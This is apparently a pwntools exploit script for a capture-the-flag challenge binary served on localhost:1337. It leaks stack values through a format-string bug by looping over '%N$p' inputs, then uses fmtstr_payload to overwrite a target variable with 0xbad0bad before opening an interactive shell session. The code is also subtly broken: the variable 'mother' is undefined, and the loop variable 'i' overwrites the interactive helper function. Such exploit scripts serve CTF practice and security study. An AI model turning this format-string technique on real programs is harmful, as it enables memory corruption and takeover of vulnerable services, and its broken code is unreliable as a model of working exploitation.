from pwn import *
from icecream import ic

elf = exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
# context.log_level = "debug"
context.aslr = True
context.arch = 'x86-64'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x00000000000014bf
pie b 0x00000000000014d5
# pie b 0x00000000000015c9
pie b 0x0000000000001417
pie b 0x00000000000014a1
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

# sl(b'%3$p')
# rl()
# ru("* ")
# leak = int(re(14), 16)
# libc.address = leak - 0x114887
for i in range(100):
    ru("say:")
    sl(f'AAAA%{i}$p'.encode())
    rl()
    ru("* ")
    print(rl())
# sl(b'%11$p')
# rl()
# ru("* ")
# stackleak = int(re(14), 16)

# ic(hex(libc.address))
ic(hex(elf.address))
# ic(stackleak)
payload = fmtstr_payload(11, {mother: 0xbad0bad})
sl(payload)
# sl(b'flag')
i()
